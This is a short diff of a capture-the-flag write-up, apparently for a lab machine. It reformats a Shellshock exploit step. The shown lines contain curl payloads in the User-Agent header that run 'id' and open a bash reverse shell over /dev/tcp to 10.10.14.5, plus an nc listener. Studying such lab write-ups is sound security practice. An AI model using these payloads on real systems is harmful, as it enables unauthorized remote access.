@@ -39,7 +39,9 @@ Get a revershell:
 Alternatively, use `curl`: 
 + `curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.10.10.56/cgi-bin/user.sh`
 + `nc -lnvp 5555`
-+ `curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.5/5555 0>&1" http://10.10.10.56/cgi-bin/user.sh`
+```
+curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.5/5555 0>&1" http://10.10.10.56/cgi-bin/user.sh
+```
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/998447b4-78ef-40c0-929c-17cfbd01c157)
 
 + `sudo -l -l`
